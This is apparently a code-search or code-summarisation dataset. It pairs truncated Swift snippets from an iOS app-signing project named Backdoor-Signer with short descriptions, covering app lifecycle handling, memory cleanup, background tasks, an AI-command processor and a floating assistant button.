    "code": "extension Notification.Name {\nstatic let appWillBecomeInactive = Notification.Name(\"appWillBecomeInactive\")\nstatic let appDidEnterBackground = Notification.Name(\"appDidEnterBackground\")\nstatic let appWillEnterForeground = Notification.Name(\"appWillEnterForeground\")\nstatic let appDidBecomeActive = Notification.Name(\"appDidBecomeActive\")\nstatic let appWillTerminate = Notification.Name(\"appWillTerminate\")\nstatic let appDidReceiveMemoryWarning = Notification.Name(\"appDidReceiveMemoryWarning\")\nstatic let appStateDidSave = Notification.Name(\"appStateDidSave\")\nstatic let appStateRestorationCompleted = Notification.Name(\"appStateRestorationCompleted\")\nstatic let appPreparingForForeground = Notification.Name(\"appPreparingForForeground\")",
    "nl": "MARK: - Notification Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1905",
    "code": "extension CoreDataManager {\n/// Verifies Core Data store consistency\nfunc verifyStoreConsistency() throws {",
    "nl": "MARK: - Core Data Manager Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1906",
    "code": "func verifyStoreConsistency() throws {\n// Implementation would check Core Data store integrity\n// This is a placeholder for the actual implementation\n}\n\n/// Attempts to recover a damaged Core Data store\nfunc attemptStoreRecovery() {",
    "nl": "/ Verifies Core Data store consistency",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1907",
    "code": "func attemptStoreRecovery() {\n// Implementation would attempt to recover from Core Data issues\n// This is a placeholder for the actual implementation\n}\n}\n",
    "nl": "/ Attempts to recover a damaged Core Data store",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppLifecycleManager.swift",
    "code_type": "function"
  },
  {
    "id": "1908",
    "code": "final class AppPerformanceOptimizer {\n// MARK: - Singleton\n\n/// Shared instance\nstatic let shared = AppPerformanceOptimizer()\n\n// MARK: - Properties\n\n/// Background task identifiers\nprivate var backgroundTasks = [String: UIBackgroundTaskIdentifier]()",
    "nl": "/ A centralized manager for app-wide performance optimization",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "class"
  },
  {
    "id": "1909",
    "code": "private func registerForAppLifecycleEvents() {\n// Foreground notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleAppWillEnterForeground),\nname: UIApplication.willEnterForegroundNotification,\nobject: nil\n)\n\n// Background notifications",
    "nl": "MARK: - App Lifecycle / Register for app lifecycle events",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1910",
    "code": "@objc private func handleAppWillEnterForeground() {\nDebug.shared.log(message: \"App will enter foreground, optimizing performance\", type: .info)\n\n// Clear any unnecessary caches\nperformLightMemoryCleanup()\n\n// Reset metrics\nmetrics.resetMetrics()\n\n// Restart memory check timer",
    "nl": "Function handleAppWillEnterForeground - implements handleappwillenterforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1911",
    "code": "@objc private func handleAppDidEnterBackground() {\nDebug.shared.log(message: \"App did enter background, performing cleanup\", type: .info)\n\n// Stop memory check timer\nmemoryCheckTimer?.invalidate()\nmemoryCheckTimer = nil\n\n// Perform cleanup\nperformDeepMemoryCleanup()\n",
    "nl": "Function handleAppDidEnterBackground - implements handleappdidenterbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1912",
    "code": "@objc private func handleAppWillTerminate() {\nDebug.shared.log(message: \"App will terminate, performing final cleanup\", type: .info)\n\n// Save all Core Data\nsaveAllManagedObjectContexts()\n\n// End all background tasks\nendAllBackgroundTasks()\n\n// Cancel all network operations",
    "nl": "Function handleAppWillTerminate - implements handleappwillterminate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1913",
    "code": "private func startMemoryCheckTimer() {\n// Stop existing timer if any\nmemoryCheckTimer?.invalidate()\n\n// Create new timer\nmemoryCheckTimer = Timer.scheduledTimer(\ntimeInterval: 30.0, // Check every 30 seconds\ntarget: self,\nselector: #selector(checkMemoryUsage),\nuserInfo: nil,",
    "nl": "MARK: - Memory Management / Start the memory check timer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1914",
    "code": "@objc private func checkMemoryUsage() {\nlet memoryUsage = getCurrentMemoryUsage()\nmetrics.updateMemoryUsage(memoryUsage)\n\nDebug.shared.log(message: \"Memory usage: \\(Int(memoryUsage * 100))%\", type: .debug)\n\n// If memory usage is above threshold, perform cleanup\nif memoryUsage > memoryThreshold {",
    "nl": "Function checkMemoryUsage - implements checkmemoryusage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1915",
    "code": "@objc private func handleMemoryWarning() {\nDebug.shared.log(message: \"Memory warning received, performing deep cleanup\", type: .warning)\n\n// Record the warning\nmetrics.recordMemoryWarning()\n\n// Perform deep memory cleanup\nperformDeepMemoryCleanup()\n}\n",
    "nl": "/ Handle memory warning from the system",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1916",
    "code": "private func getCurrentMemoryUsage() -> Float {\nvar info = mach_task_basic_info()\nvar count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size) / 4\n\nlet kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {",
    "nl": "/ Get current memory usage as a percentage (0.0 to 1.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1917",
    "code": "private func performLightMemoryCleanup() {\n// Clear image memory cache\nImageCache.shared.clearCache()\n\n// Clean NSURLCache\nURLCache.shared.removeAllCachedResponses()\n\n// Reset NSURLSession cache\nlet configuration = URLSessionConfiguration.default\nconfiguration.urlCache = nil",
    "nl": "/ Perform a light memory cleanup (non-disruptive)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1918",
    "code": "private func performDeepMemoryCleanup() {\n// Perform light cleanup first\nperformLightMemoryCleanup()\n\n// Clear network response cache\nNetworkManager.shared.clearCache()\n\n// Reset all tableview optimizers' caches\npurgeTableViewOptimizerCaches()\n",
    "nl": "/ Perform a deep memory cleanup (more aggressive)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1919",
    "code": "private func resetUnneededCoreDataCaches() {\ndo {",
    "nl": "/ Reset unneeded Core Data caches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1920",
    "code": "private func saveAllManagedObjectContexts() {\ndo {",
    "nl": "/ Save all managed object contexts",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1921",
    "code": "private func purgeTableViewOptimizerCaches() {\nNotificationCenter.default.post(\nname: Notification.Name(\"PurgeTableViewOptimizerCaches\"),\nobject: nil,\nuserInfo: nil\n)\n}\n\n// MARK: - Background Task Management\n",
    "nl": "/ Purge all TableViewOptimizer caches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1922",
    "code": "func beginBackgroundTask(identifier: String, expirationHandler: (() -> Void)? = nil) {\ntaskMutex.lock()\ndefer { taskMutex.unlock() }",
    "nl": "MARK: - Background Task Management / Begin a background task / - Parameters: /   - identifier: A unique identifier for the task /   - expirationHandler: Block to execute if the task is about to expire",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1923",
    "code": "func endBackgroundTask(identifier: String) {\ntaskMutex.lock()\ndefer { taskMutex.unlock() }",
    "nl": "/ End a background task / - Parameter identifier: The identifier of the task to end",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1924",
    "code": "private func endAllBackgroundTasks() {\ntaskMutex.lock()\ndefer { taskMutex.unlock() }",
    "nl": "/ End all background tasks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1925",
    "code": "func performBackgroundTask(identifier: String, task: @escaping () -> Void, completion: (() -> Void)? = nil) {\n// Start background task to keep app running\nbeginBackgroundTask(identifier: identifier)\n\n// Add operation to background queue\nbackgroundQueue.addOperation { [weak self] in",
    "nl": "MARK: - Public Methods / Perform a task in the background / - Parameters: /   - identifier: A unique identifier for the task /   - task: The task to perform /   - completion: Completion handler called on the main thread",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1926",
    "code": "func optimizeViewController(_ viewController: UIViewController) {\n// Enable scrollsToTop only for visible scroll views\ndisableScrollsToTopForHiddenViews(in: viewController.view)\n\n// Configure Core Data fetching for better performance\nconfigureCoreDataFetching(for: viewController)\n\n// Optimize image loading\ndeferImageLoading(in: viewController.view)\n}",
    "nl": "/ Optimize a view controller for better performance / - Parameter viewController: The view controller to optimize",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1927",
    "code": "private func disableScrollsToTopForHiddenViews(in view: UIView) {\nvar visibleScrollViewFound = false\n\nfor subview in view.subviews {",
    "nl": "MARK: - View Optimization Methods / Disable scrollsToTop for hidden scroll views / - Parameter view: The parent view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1928",
    "code": "private func configureCoreDataFetching(for viewController: UIViewController) {\n// Check if the view controller uses Core Data\nif viewController is UITableViewController {",
    "nl": "/ Configure Core Data fetching for better performance / - Parameter viewController: The view controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1929",
    "code": "private func deferImageLoading(in view: UIView) {\nfor subview in view.subviews {",
    "nl": "/ Defer image loading for off-screen views / - Parameter view: The parent view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1930",
    "code": "class PerformanceMetrics {\n// MARK: - Properties\n\n/// Peak memory usage (0.0 to 1.0)\nprivate(set) var peakMemoryUsage: Float = 0.0\n\n/// Number of memory warnings received\nprivate(set) var memoryWarningCount: Int = 0\n\n/// When the metrics were last reset",
    "nl": "MARK: - Performance Metrics / Tracks performance metrics for the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "class"
  },
  {
    "id": "1931",
    "code": "func resetMetrics() {\npeakMemoryUsage = 0.0\nmemoryWarningCount = 0\nlastResetTime = Date()\nmemoryUsageHistory.removeAll()\n}\n\n/// Update the memory usage\n/// - Parameter usage: Current memory usage (0.0 to 1.0)\nfunc updateMemoryUsage(_ usage: Float) {",
    "nl": "MARK: - Methods / Reset all metrics",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1932",
    "code": "func updateMemoryUsage(_ usage: Float) {\n// Update peak memory usage\npeakMemoryUsage = max(peakMemoryUsage, usage)\n\n// Add to history\nmemoryUsageHistory.append(usage)\n\n// Keep only the last 10 readings\nif memoryUsageHistory.count > 10 {",
    "nl": "/ Update the memory usage / - Parameter usage: Current memory usage (0.0 to 1.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1933",
    "code": "func recordMemoryWarning() {\nmemoryWarningCount += 1\n}\n\n/// Get the average memory usage\n/// - Returns: Average memory usage (0.0 to 1.0)\nfunc averageMemoryUsage() -> Float {",
    "nl": "/ Record a memory warning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1934",
    "code": "func averageMemoryUsage() -> Float {\nguard !memoryUsageHistory.isEmpty else { return 0.0 }",
    "nl": "/ Get the average memory usage / - Returns: Average memory usage (0.0 to 1.0)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1935",
    "code": "extension UIView {\n/// Check if the view is visible on screen\n/// - Returns: True if the view is visible\nfunc isVisible() -> Bool {",
    "nl": "MARK: - UIView Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "extension"
  },
  {
    "id": "1936",
    "code": "func isVisible() -> Bool {\nguard !isHidden && alpha > 0 else { return false }",
    "nl": "/ Check if the view is visible on screen / - Returns: True if the view is visible",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppPerformanceOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1937",
    "code": "class CustomCommandProcessor {\n// Singleton instance\nstatic let shared = CustomCommandProcessor()\n\n// Private initializer for singleton\nprivate init() {",
    "nl": "/ Processes commands extracted from AI responses",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "class"
  },
  {
    "id": "1938",
    "code": "func processCommand(_ commandString: String, completion: @escaping (AppCommandResult) -> Void) {\n// Extract command and parameter\nlet components = commandString.split(separator: \":\", maxSplits: 1).map(String.init)\n\nguard components.count >= 1 else {",
    "nl": "/ Process a command extracted from an AI response / - Parameters: /   - commandString: The full command string containing command and parameter /   - completion: Callback with result information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1939",
    "code": "private func executeCommand(_ command: String, parameter: String, completion: @escaping (AppCommandResult) -> Void) {\n// Log command execution\nDebug.shared.log(message: \"Executing command: \\(command) with parameter: \\(parameter)\", type: .info)\n\n// Check if the command is registered with AppContextManager\nif AppContextManager.shared.availableCommands().contains(command.lowercased()) {",
    "nl": "/ Execute a command with the given parameter / - Parameters: /   - command: The command to execute /   - parameter: The parameter for the command /   - completion: Callback with result information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1940",
    "code": "private func signApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {\n// Find app in downloaded apps\nlet downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()\nlet matchingApps = downloadedApps.filter {",
    "nl": "MARK: - Command Implementations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1941",
    "code": "private func installApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {\n// Simulate app installation\ncompletion(\n.successWithResult(\n\"Installation command received for '\\(appName)'. In a real implementation, this would begin the installation process.\"\n)\n)\n}\n\nprivate func openApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {",
    "nl": "Function installApp - implements installapp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1942",
    "code": "private func openApp(named appName: String, completion: @escaping (AppCommandResult) -> Void) {\n// Find app in signed apps\nlet signedApps = CoreDataManager.shared.getDatedSignedApps()\nlet matchingApps = signedApps.filter {",
    "nl": "Function openApp - implements openapp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1943",
    "code": "private func showHelp(topic: String, completion: @escaping (AppCommandResult) -> Void) {\nvar helpText = \"Backdoor AI Assistant Help\"\n\nif topic.isEmpty {",
    "nl": "Function showHelp - implements showhelp functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/CustomCommandProcessor.swift",
    "code_type": "function"
  },
  {
    "id": "1944",
    "code": "extension Notification.Name {\nstatic let showAIAssistant = Notification.Name(\"showAIAssistant\")\n// Tab change notifications are defined in TabbarView.swift\n}\n\n/// Manages AI assistant functionality across the app\nfinal class FloatingButtonManager {",
    "nl": "MARK: - Notification Names",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1945",
    "code": "final class FloatingButtonManager {\n// Singleton instance\nstatic let shared = FloatingButtonManager()\n\n// Thread-safe state tracking with a dedicated queue\nprivate let stateQueue = DispatchQueue(label: \"com.backdoor.floatingButtonState\", qos: .userInteractive)\nprivate var _isPresentingChat = false\nprivate var isPresentingChat: Bool {",
    "nl": "/ Manages AI assistant functionality across the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "class"
  },
  {
    "id": "1946",
    "code": "private func setupObservers() {\n// Use processingQueue to ensure thread safety when setting up observers\nprocessingQueue.async { [weak self] in",
    "nl": "Function setupObservers - sets upobservers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1947",
    "code": "@objc private func handleAppDidBecomeActive() {\nisAppActive = true\n}\n\n@objc private func handleAppWillResignActive() {",
    "nl": "Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1948",
    "code": "@objc private func handleAppWillResignActive() {\nisAppActive = false\n}\n\nprivate func setupAIInteraction() {",
    "nl": "Function handleAppWillResignActive - implements handleappwillresignactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1949",
    "code": "private func setupAIInteraction() {\n// Set up AI interaction\nDebug.shared.log(message: \"AI interaction setup complete\", type: .debug)\n}\n\n// MARK: - Public Methods\n\n/// Programmatically show the AI assistant\nfunc showAIAssistant() {",
    "nl": "Function setupAIInteraction - sets upaiinteraction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1950",
    "code": "func showAIAssistant() {\nhandleAIRequest()\n}\n\n/// Show the floating button - wrapper for showAIAssistant\nfunc show() {",
    "nl": "MARK: - Public Methods / Programmatically show the AI assistant",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1951",
    "code": "func show() {\nshowAIAssistant()\n}\n\n/// Hide the floating button\nfunc hide() {",
    "nl": "/ Show the floating button - wrapper for showAIAssistant",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1952",
    "code": "func hide() {\n// Reset state if currently presenting\nif isPresentingChat {",
    "nl": "/ Hide the floating button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1953",
    "code": "@objc private func handleAIRequest() {\n// Skip if already presenting or app is inactive\nguard !isPresentingChat, isAppActive else {",
    "nl": "MARK: - AI Request Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1954",
    "code": "private func presentChatInterfaceSafely(with session: ChatSession, from presenter: UIViewController) {\n// Validate the presenter is still valid and not in transition\nguard !presenter.isBeingDismissed,\n!presenter.isBeingPresented,\n!presenter.isMovingToParent,\n!presenter.isMovingFromParent,\npresenter.view.window != nil\nelse {",
    "nl": "Function presentChatInterfaceSafely - implements presentchatinterfacesafely functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1955",
    "code": "private func presentViewControllerSafely(_ viewController: UIViewController, from presenter: UIViewController) {\n// Check if presenter is valid - if not, reset state and return\nguard !presenter.isBeingDismissed, !presenter.isBeingPresented, presenter.view.window != nil else {",
    "nl": "Function presentViewControllerSafely - implements presentviewcontrollersafely functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1956",
    "code": "private func performPresentation(_ viewController: UIViewController, from presenter: UIViewController) {\n// Present directly without try-catch since UIKit presentation doesn't throw\npresenter.present(viewController, animated: true) {",
    "nl": "Function performPresentation - implements performpresentation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1957",
    "code": "private func showErrorAlert(message: String, on viewController: UIViewController) {\nlet alert = UIAlertController(\ntitle: \"Chat Error\",\nmessage: message,\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\n\n// Present alert with a slight delay to ensure any pending transitions complete",
    "nl": "Function showErrorAlert - implements showerroralert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/FloatingButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "1958",
    "code": "final class OptimizationIntegrator {\n// MARK: - Singleton\n\n/// Shared instance\nstatic let shared = OptimizationIntegrator()\n\n// MARK: - Properties\n\n/// Flag to track if the optimizations have been integrated\nprivate var didIntegrateOptimizations = false",
    "nl": "/ Integrates all performance optimizations into the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "class"
  },
  {
    "id": "1959",
    "code": "func integrateOptimizations(in _: UIApplication) {\nguard !didIntegrateOptimizations else {",
    "nl": "MARK: - Integration / Integrate all optimizations into the app / - Parameter application: The UIApplication instance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1960",
    "code": "private func initializeOptimizers() {\n// The act of accessing these shared instances initializes them\n_ = AppPerformanceOptimizer.shared\n_ = ImageCache.shared\n_ = NetworkManager.shared\n\nDebug.shared.log(message: \"Performance optimizers initialized\", type: .debug)\n}\n\n/// Register for needed notifications",
    "nl": "MARK: - Setup Methods / Initialize all optimizer components",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1961",
    "code": "private func registerForNotifications() {\n// Register for view controller lifecycle notifications\nlet notificationCenter = NotificationCenter.default\n\n// Register for app lifecycle notifications\nnotificationCenter.addObserver(\nself,\nselector: #selector(handleAppDidBecomeActive),\nname: UIApplication.didBecomeActiveNotification,\nobject: nil",
    "nl": "/ Register for needed notifications",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1962",
    "code": "private func configureNetworkOptimizations() {\n// Configure URLCache with appropriate sizes\nlet memoryCapacity = 10 * 1024 * 1024 // 10 MB\nlet diskCapacity = 50 * 1024 * 1024 // 50 MB\nlet cache = URLCache(memoryCapacity: memoryCapacity, diskCapacity: diskCapacity, diskPath: \"URLCache\")\nURLCache.shared = cache\n\n// Configure URLSession\nlet config = URLSessionConfiguration.default\nconfig.requestCachePolicy = .useProtocolCachePolicy",
    "nl": "/ Configure network optimizations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1963",
    "code": "private func optimizeListViews() {\n// Register for UITableView.shouldPrefetchDataSource\n// We'll optimize table views as they're created\n\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleViewControllerDidLoad),\nname: NSNotification.Name(\"ViewControllerDidLoad\"),\nobject: nil\n)",
    "nl": "/ Apply global optimizations to table and collection views",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1964",
    "code": "private func applyMethodSwizzling() {\n// Swizzle view controller lifecycle methods to add optimization\nUIViewController.optimizeLifecycleMethods()\n\nDebug.shared.log(message: \"Method swizzling applied\", type: .debug)\n}\n\n// MARK: - Notification Handlers\n\n@objc private func handleViewControllerDidLoad(_ notification: Notification) {",
    "nl": "/ Apply method swizzling for performance optimizations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1965",
    "code": "@objc private func handleViewControllerDidLoad(_ notification: Notification) {\nif let viewController = notification.object as? UIViewController {",
    "nl": "MARK: - Notification Handlers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1966",
    "code": "@objc private func handleAppDidBecomeActive() {\nDebug.shared.log(message: \"App became active, applying dynamic optimizations\", type: .debug)\n\n// Optimize currently visible view controller\nif let topVC = UIApplication.shared.topMostViewController() {",
    "nl": "Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1967",
    "code": "@objc private func handleLowMemoryWarning() {\nDebug.shared.log(message: \"Handling low memory warning\", type: .warning)\n\n// Clear image caches\nImageCache.shared.clearCache()\n\n// Clear network caches\nNetworkManager.shared.clearCache()\n\n// Clear any NSCache instances",
